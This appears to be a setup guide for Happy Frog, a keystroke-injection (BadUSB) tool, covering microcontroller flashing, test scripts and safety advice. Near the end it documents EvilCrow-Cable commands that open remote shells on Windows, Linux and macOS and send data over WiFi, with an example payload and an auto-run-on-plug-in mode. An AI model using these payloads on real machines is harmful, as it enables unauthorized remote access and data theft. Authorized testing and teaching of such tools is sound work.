# Microcontroller Setup Guide

This guide covers the setup and configuration of microcontrollers for use with Happy Frog. The focus is on affordable, educational-friendly devices.

## 🐸 Supported Devices

Happy Frog supports multiple microcontrollers for maximum flexibility and accessibility:

### Complete Device List

| Device ID | Name | Type | Output Format | Status |
|-----------|------|------|---------------|--------|
| `xiao_rp2040` | Seeed Xiao RP2040 | CircuitPython | `.py` | ✅ **Recommended** |
| `raspberry_pi_pico` | Raspberry Pi Pico | CircuitPython | `.py` | ✅ **Production Ready** |
| `arduino_leonardo` | Arduino Leonardo | Arduino | `.ino` | ✅ **Production Ready** |
| `teensy_4` | Teensy 4.0 | Arduino | `.ino` | ✅ **Production Ready** |
| `digispark` | DigiSpark | Arduino | `.ino` | ✅ **Production Ready** |
| `esp32` | ESP32 | Arduino (Bluetooth) | `.ino` | ✅ **Production Ready** |
| `evilcrow_cable` | EvilCrow-Cable | Arduino | `.ino` | ✅ **Production Ready** |
| `android` | Android Device | Android HID | `.ino` | ✅ **Production Ready** |

### Device Categories

#### 🥇 **CircuitPython Devices** (Recommended for Beginners)
- **Seeed Xiao RP2040** - Primary recommendation
- **Raspberry Pi Pico** - Popular alternative
- **ESP32** - WiFi-enabled option

#### 🥈 **Arduino Devices** (For Advanced Users)
- **Arduino Leonardo** - Classic choice with native USB HID
- **Teensy 4.0** - High-performance ARM Cortex-M7 option
- **DigiSpark** - Budget-friendly ultra-compact option
- **EvilCrow-Cable** - Specialized BadUSB device with WiFi capabilities
- **Android Device** - Android-specific automation with mobile device capabilities

### Adding New Devices

If you see a microcontroller we're missing that you'd like added:
1. **Open an issue** on GitHub with your suggestion
2. **Include device specifications** and capabilities
3. **Provide links** to documentation and purchase options
4. **Explain why** it would be a good addition

---

## 🎯 Recommended Hardware

### Seeed Xiao RP2040 (Primary Recommendation)

![Screenshot 2025-06-26 144035](https://github.com/user-attachments/assets/80f5cd55-c4ba-4b86-86c8-b959b4d24372)

**Why Choose the Xiao RP2040:**
- ✅ **Affordable**: ~$5-8 USD
- ✅ **Powerful**: Dual-core ARM Cortex-M0+ at 133MHz
- ✅ **CircuitPython Support**: Excellent compatibility
- ✅ **USB-C**: Modern connectivity
- ✅ **Small Form Factor**: Easy to work with
- ✅ **Educational**: Great for learning

**Specifications:**
- **Processor**: Raspberry Pi RP2040 (Dual-core ARM Cortex-M0+)
- **Clock Speed**: 133MHz
- **Memory**: 264KB SRAM, 2MB Flash
- **USB**: USB-C connector
- **GPIO**: 11 digital pins, 4 analog pins
- **Size**: 21 x 17.5mm
- **Price**: ~$5-8 USD

**Where to Buy:**
- [Seeed Studio](https://www.seeedstudio.com/XIAO-RP2040-v1-0-p-5026.html)
- [Amazon](https://www.amazon.com/s?k=seeed+xiao+rp2040)
- [Adafruit](https://www.adafruit.com/product/4864)

**USBA to USBC M-M**
- [Amazon](https://a.co/d/8QPZOx5)

![IMG_3282](https://github.com/user-attachments/assets/cf64a801-9ec2-4b2a-854a-2c21ea4f8a49)


## 🔧 Setup Instructions

### Step 1: Install CircuitPython

1. **Download CircuitPython Firmware**
   - Visit [circuitpython.org](https://circuitpython.org/)
   - Find your board in the list or go straight to [xiao rp2040](https://circuitpython.org/board/seeeduino_xiao_rp2040/)
   - Download the appropriate `.uf2` file


2. **Enter Bootloader Mode**
   - Hold the button with a 'B' next to it
   - Connect your Xiao RP2040 via USB-C
   - The device should appear as a USB drive named `RPI-RP2`

3. **Flash CircuitPython**
   - Copy the downloaded `.uf2` file to the `RPI-RP2` drive
   - The device will automatically restart
   - You should now see a `CIRCUITPY` drive

![Screenshot 2025-06-26 144052](https://github.com/user-attachments/assets/fc8bed90-7c0d-4d9c-8f9d-a41d7131e159)

4. **Verify Installation**
   - Open the `CIRCUITPY` drive
   - You should see `boot_out.txt` and `code.py` files
   - The `code.py` file is where your Happy Frog code will go

### Step 2: Install Required Libraries

1. **Download CircuitPython Library Bundle**
   - Go to [circuitpython.org/libraries](https://circuitpython.org/libraries)
   - Download the latest library bundle

![Screenshot 2025-06-26 144016](https://github.com/user-attachments/assets/c77311cb-b888-4df7-ac77-dd41e94a93ef)

2. **Extract and Copy Libraries**
   - Extract the downloaded bundle
   - Create a `lib` folder on your `CIRCUITPY` drive
   - Copy the following folders to `lib`:
     - `adafruit_hid`
     - `adafruit_hid.keyboard`
     - `adafruit_hid.keyboard_layout_us`
     - `adafruit_hid.keycode`

     *or you can copy the entire lib folder and paste/replace the one already there.*

3. **Verify Library Installation**
   - Your `CIRCUITPY` drive should now have:
     ```
     CIRCUITPY/
     ├── lib/
     │   ├── adafruit_hid/
     │   ├── adafruit_hid.keyboard/
     │   ├── adafruit_hid.keyboard_layout_us/
     │   └── adafruit_hid.keycode/
     ├── boot_out.txt
     └── code.py
     ```

### Step 3: Test Basic Functionality

1. **Create a Test Script**
   Create a file called `test.py` on your `CIRCUITPY` drive:

   ```python
   import time
   import usb_hid
   from adafruit_hid.keyboard import Keyboard
   from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
   from adafruit_hid.keycode import Keycode

   # Initialize HID devices
   keyboard = Keyboard(usb_hid.devices)
   keyboard_layout = KeyboardLayoutUS(keyboard)

   def main():
       print("Testing HID functionality...")
       time.sleep(2)
       
       # Type a test message
       keyboard_layout.write("HID Test - Hello World!")
       time.sleep(0.5)
       
       # Press Enter
       keyboard.press(Keycode.ENTER)
       keyboard.release(Keycode.ENTER)
       
       print("Test completed!")

   if __name__ == "__main__":
       main()
   ```

2. **Rename and Test**
   - Rename `test.py` to `code.py`
   - The device will automatically run the code
   - Connect to a test computer and observe the output

   ***IMPORTANT!!! whatever code you put into code.py WILL AUTOMATICALLY RUN THE INSTANT YOU DO THIS in ATTACKMODE*** please know what you are writing, I am not responsible if you freakin dox yourself or you give your pc a cold. To avoid anything from auto running on your device, you can:

![Screenshot 2025-06-26 145823](https://github.com/user-attachments/assets/e607c929-3a07-4b65-af52-57e0cafb2407)

##  Testing Method Options 

### Option 1: Virtual Machine (Recommended)
**The Safest Approach:**
- **VM Software**: Use VirtualBox, VMware, or Hyper-V
- **Isolated Environment**: No access to host system or network
- **Snapshot Before Testing**: Create restore points
- **Disconnect Network**: Remove network adapters during testing
- **Test OS**: Use Windows 10/11 VM or Linux VM

**VM Setup Steps:**
1. Install VirtualBox/VMware
2. Create new VM with Windows 10/11
3. Disable network adapters
4. Take snapshot before testing
5. Connect your microcontroller
6. Test your payload
7. Restore snapshot after testing

### Option 2: Dedicated Test Machine 
*This is what I use, and that laptop has been wiped and flashed, with multiple OS, a hundred times in the process*
**Physical Isolation:**
- **Old Laptop**: Use a spare/old computer
- **No Important Data**: Wipe and reinstall OS
- **No Network**: Disconnect WiFi/Ethernet
- **No Personal Accounts**: Use test accounts only
- **Fresh Install**: Clean OS installation

### Option 3: Live USB/DVD
**Temporary Environment:**
- **Linux Live USB**: Ubuntu, Kali Linux, or Tails
- **No Installation**: Runs from USB without affecting system
- **Temporary**: No permanent changes
- **Isolated**: Separate from main OS

### Option 4: Sandboxed Environment
**Advanced Isolation:**
- **Windows Sandbox**: Built-in Windows feature
- **Docker Containers**: For Linux-based testing
- **Application Sandboxing**: Tools like Sandboxie
- **Browser Isolation**: For web-based testing

## 🔒 Additional Safety Measures

### Before Testing
1. **Backup Everything**: Create system restore points
2. **Document Your Setup**: Keep notes of what you're testing
3. **Use Test Accounts**: Never use personal accounts
4. **Disconnect Networks**: Remove internet access
5. **Prepare Recovery**: Have recovery media ready

### During Testing
1. **Monitor Closely**: Watch for unexpected behavior
2. **Have Escape Plan**: Know how to stop execution
3. **Keep Logs**: Document what happens
4. **Stay Focused**: Don't multitask during testing
5. **Be Ready to Pull**: Keep device easily removable

### After Testing
1. **Restore Environment**: Return to clean state
2. **Review Logs**: Check what actually happened
3. **Clean Up**: Remove any test files/registry entries
4. **Document Results**: Keep notes for future reference
5. **Verify Safety**: Ensure no persistent changes


## 🎯 Best Practices Summary

### ✅ Do This:
- Test in isolated environments
- Use VMs or dedicated test machines
- Create backups before testing
- Document everything you do
- Start with simple, harmless scripts
- Test one component at a time
- Keep devices in secure locations

### ❌ Don't Do This:
- Test on production systems
- Use personal accounts or data
- Connect to networks during testing
- Test without proper isolation
- Skip safety procedures
- Share devices with others during testing
- Ignore warning signs

## 🔧 Safe Development Workflow

### 1. Development Phase
```bash
# Write and test scripts in safe environment
happy-frog payloads/test_script.txt -o test_output.py
# Review the generated code before deployment
```

### 2. Testing Phase
- Use VM or isolated machine
- Test with simple payloads first
- Verify expected behavior
- Document any issues

### 3. Deployment Phase
- Only deploy to authorized systems
- Use proper authentication
- Monitor execution
- Have rollback plan ready

## 📋 Safety Checklist

Before every test, verify:
- [ ] Testing in isolated environment
- [ ] No important data at risk
- [ ] Network disconnected
- [ ] Backup created
- [ ] Recovery plan ready
- [ ] Script reviewed for safety
- [ ] Emergency procedures known
- [ ] Proper authorization obtained

## 🎓 Educational Responsibility

**Remember:** This tool is for learning and authorized testing only. The goal is to understand how systems work, not to cause harm or disruption. Always:

- **Respect Systems**: Only test what you own or have permission to test
- **Learn Safely**: Use proper isolation and safety measures
- **Share Knowledge**: Help others learn safely
- **Report Issues**: If you find vulnerabilities, report them responsibly
- **Stay Legal**: Follow all applicable laws and regulations

**The best security researcher is one who can find vulnerabilities without causing damage.**

## 🐸 Using Happy Frog with Your Device

### Step 1: Generate CircuitPython Code

```bash
# Generate code from a Ducky Script
happy-frog payloads/hello_world.txt -o output.py
```

### Step 2: Upload to Device

1. **Copy Generated Code**
   - Copy the generated `output.py` file
   - Paste it as `code.py` on your `CIRCUITPY` drive
   - The device will automatically restart and run the code

2. **Test in Controlled Environment**
   - Connect to a test computer
   - Wait for device recognition
   - Observe the automated behavior
   - **Always test safely!**

### Step 3: Customize and Experiment

1. **Modify the Code**
   - Edit `code.py` directly on the device
   - Changes take effect immediately
   - No need to recompile or reflash

2. **Add Safety Features**
   - Implement startup delays
   - Add confirmation prompts
   - Include error handling

## 🔌 Alternative Microcontrollers

### Raspberry Pi Pico
- **Pros**: Same RP2040 chip, official Raspberry Pi product
- **Cons**: Slightly larger, more expensive
- **Setup**: Similar to Xiao RP2040

### Adafruit ItsyBitsy RP2040
- **Pros**: High-quality, good documentation
- **Cons**: More expensive (~$9-12)
- **Setup**: Same CircuitPython process

### ESP32-S2/S3 Boards
- **Pros**: WiFi capability, more features
- **Cons**: More complex setup, larger size
- **Setup**: Requires different firmware

### Arduino Pro Micro (ATmega32U4)
- **Pros**: Very small, widely available
- **Cons**: Limited memory, different programming
- **Setup**: Requires Arduino IDE and custom libraries

## 🛡️ Security Considerations

### Physical Security
- **Device Storage**: Keep devices in secure locations
- **Access Control**: Limit who can access your devices
- **Inventory**: Keep track of all devices

### Operational Security
- **Testing Environment**: Use isolated test systems
- **Network Isolation**: Disconnect from networks during testing
- **Monitoring**: Watch for unexpected behavior

### Educational Best Practices
- **Documentation**: Keep detailed records of all activities
- **Authorization**: Always get proper permission
- **Responsible Disclosure**: Report any vulnerabilities found

## 🎯 Android Device Specialty Commands

The Android device supports mobile-specific automation commands that are unique to Android systems. These commands provide enhanced functionality for mobile device automation and security research.

### Available Android Commands

#### **ANDROID_HOME** - Home Button
```bash
ANDROID_HOME
```
Navigates to the Android home screen.

#### **ANDROID_BACK** - Back Button
```bash
ANDROID_BACK
```
Navigates back to the previous screen.

#### **ANDROID_MENU** - Menu Button
```bash
ANDROID_MENU
```
Opens the context menu.

#### **ANDROID_APP_SWITCH** - App Switcher
```bash
ANDROID_APP_SWITCH
```
Opens the recent apps switcher.

#### **ANDROID_NOTIFICATIONS** - Notifications Panel
```bash
ANDROID_NOTIFICATIONS
```
Opens the notifications panel.

#### **ANDROID_QUICK_SETTINGS** - Quick Settings
```bash
ANDROID_QUICK_SETTINGS
```
Opens the quick settings panel.

#### **ANDROID_SCREENSHOT** - Take Screenshot
```bash
ANDROID_SCREENSHOT
```
Takes a screenshot of the current screen.

#### **ANDROID_VOLUME_UP** - Volume Up
```bash
ANDROID_VOLUME_UP
```
Increases the device volume.

#### **ANDROID_VOLUME_DOWN** - Volume Down
```bash
ANDROID_VOLUME_DOWN
```
Decreases the device volume.

#### **ANDROID_MUTE** - Mute Audio
```bash
ANDROID_MUTE
```
Mutes the device audio.

#### **ANDROID_POWER** - Power Button
```bash
ANDROID_POWER
```
Simulates a power button press.

#### **ANDROID_OPEN_APP** - Open Application
```bash
ANDROID_OPEN_APP Calculator
```
Opens a specific application by name.

#### **ANDROID_CLOSE_APP** - Close Application
```bash
ANDROID_CLOSE_APP
```
Closes the current application.

#### **ANDROID_CLEAR_RECENTS** - Clear Recent Apps
```bash
ANDROID_CLEAR_RECENTS
```
Clears all recent applications.

#### **ANDROID_GOOGLE_ASSISTANT** - Google Assistant
```bash
ANDROID_GOOGLE_ASSISTANT
```
Activates Google Assistant.

#### **ANDROID_SPLIT_SCREEN** - Split Screen Mode
```bash
ANDROID_SPLIT_SCREEN
```
Enables split screen mode.

#### **ANDROID_PIP_MODE** - Picture-in-Picture
```bash
ANDROID_PIP_MODE
```
Enables picture-in-picture mode.

#### **ANDROID_ACCESSIBILITY** - Accessibility Menu
```bash
ANDROID_ACCESSIBILITY
```
Opens the accessibility menu.

#### **ANDROID_DEVELOPER_OPTIONS** - Developer Options
```bash
ANDROID_DEVELOPER_OPTIONS
```
Accesses developer options (requires setup).

### Android Setup Requirements

- **USB Debugging**: Enable USB debugging on the target Android device
- **HID Permissions**: Grant HID device permissions when prompted
- **Android Version**: Ensure compatibility with your Android version
- **Test Environment**: Always test in a controlled environment

### Example Android Payload

```bash
# Android automation example
ATTACKMODE ANDROID
DELAY 2000

# Navigate to home and open settings
ANDROID_HOME
DELAY 500
ANDROID_OPEN_APP Settings
DELAY 1000

# Take a screenshot
ANDROID_SCREENSHOT
DELAY 1000

# Return to home
ANDROID_HOME
DELAY 500
```

## 🎯 EvilCrow-Cable Specialty Commands

The EvilCrow-Cable device supports advanced BadUSB operations with WiFi capabilities. These specialty commands are unique to the EvilCrow-Cable and provide enhanced functionality for cybersecurity research and education.

### Available Specialty Commands

#### **RELEASE** - Release All Keys
```bash
RELEASE
```
Releases all currently pressed keys. Useful for cleaning up key states after complex operations.

#### **WIFI_SEND** - Send Data Over WiFi
```bash
WIFI_SEND Hello WiFi World!
```
Sends data over the WiFi serial connection. Requires WiFi module setup.

#### **WIFI_CONNECT** - Connect to WiFi Network
```bash
WIFI_CONNECT MyNetwork MyPassword
```
Connects to a WiFi network using the specified SSID and password.

#### **SHELLWIN** - Windows Remote Shell
```bash
SHELLWIN 192.168.1.100
```
Triggers a Windows remote shell connection to the specified IP address.

#### **SHELLNIX** - Linux Remote Shell
```bash
SHELLNIX 192.168.1.101
```
Triggers a Linux remote shell connection to the specified IP address.

#### **SHELLMAC** - macOS Remote Shell
```bash
SHELLMAC 192.168.1.102
```
Triggers a macOS remote shell connection to the specified IP address.

### Example EvilCrow-Cable Payload

```bash
# EvilCrow-Cable Advanced Payload Example
ATTACKMODE HID WIFI
DELAY 2000

# Basic HID operations
STRING Hello from EvilCrow-Cable!
ENTER
DELAY 1000

# WiFi operations
WIFI_SEND Status: Device connected
DELAY 500
WIFI_CONNECT MyNetwork MyPassword
DELAY 2000

# Remote shell operations
SHELLWIN 192.168.1.100
DELAY 1000
SHELLNIX 192.168.1.101
DELAY 1000

# Key management
CTRL
SHIFT
DELAY 500
RELEASE
DELAY 500

# Final message
STRING EvilCrow-Cable payload completed!
ENTER
```

### EvilCrow-Cable Setup Requirements

1. **Hardware Setup**
   - EvilCrow-Cable device with ATtiny85 processor
   - WiFi module connected to RX/TX pins (2, 3)
   - USB-C or USB-A connector (depending on model)

2. **Software Requirements**
   - Arduino IDE with EvilCrow-Cable board support
   - DigiKeyboard library
   - SoftwareSerial library (built-in)

3. **WiFi Module Configuration**
   - Baud rate: 115200
   - Pins: RX=2, TX=3
   - Compatible with ESP8266/ESP32 WiFi modules

### Production Mode Support

EvilCrow-Cable fully supports production mode with `--production` flag:
```bash
python main.py encode payloads/evilcrow_test.txt --device evilcrow_cable --production -o output.ino
```

This generates code that runs immediately on device boot/plug-in, optimized for real-world deployment scenarios.

## 🐛 Troubleshooting

### Common Issues

#### Device Not Recognized
- **Check USB Cable**: Try different cables
- **Driver Issues**: Install appropriate drivers
- **Bootloader Mode**: Double-tap reset button
- **CircuitPython**: Verify firmware installation

#### Code Not Running
- **File Name**: Ensure file is named `code.py`
- **Syntax Errors**: Check for Python syntax issues
- **Library Issues**: Verify all libraries are installed
- **Memory**: Check available memory

#### HID Not Working
- **Library Installation**: Verify `adafruit_hid` is installed
- **Device Recognition**: Wait for system to recognize device
- **Permissions**: Check system permissions
- **Timing**: Add appropriate delays

### Debugging Tips

1. **Serial Output**: Connect to serial monitor for debug output
2. **LED Indicators**: Watch onboard LEDs for status
3. **File System**: Check files on `CIRCUITPY` drive
4. **Library Versions**: Ensure compatible library versions

## 📚 Educational Resources

### CircuitPython Learning
- [CircuitPython Documentation](https://docs.circuitpython.org/)
- [Adafruit Learning System](https://learn.adafruit.com/)
- [CircuitPython Examples](https://github.com/adafruit/Adafruit_Learning_System_Guides)

### Microcontroller Basics
- [MicroPython Documentation](https://docs.micropython.org/)
- [Raspberry Pi Pico Guide](https://www.raspberrypi.org/documentation/pico/)
- [Embedded Systems Tutorials](https://www.embedded.com/)

### HID and USB
- [USB HID Specification](https://www.usb.org/document-library/device-class-definition-hid-111)
- [HID Usage Tables](https://www.usb.org/document-library/hid-usage-tables-122)
- [USB Device Classes](https://www.usb.org/defined-class-codes)

## 🔮 Future Enhancements

### Planned Features
- **WiFi Capability**: Remote triggering via network
- **Bluetooth Support**: Wireless HID emulation
- **Advanced Scripting**: More complex automation
- **GUI Interface**: Visual script editor

### Community Contributions
- **New Device Support**: Additional microcontrollers
- **Enhanced Libraries**: More HID capabilities
- **Educational Content**: Tutorials and examples
- **Security Tools**: Defensive applications

## ⚖️ Legal and Ethical Reminders

**Remember:**
- Use only for educational purposes
- Test only on systems you own or have permission to test
- Follow all applicable laws and regulations
- Report vulnerabilities responsibly
- Share knowledge ethically

**This tool is designed for learning and authorized testing. Misuse is not supported and may be illegal.**

---

**Happy coding and learning! 🐸✨** 
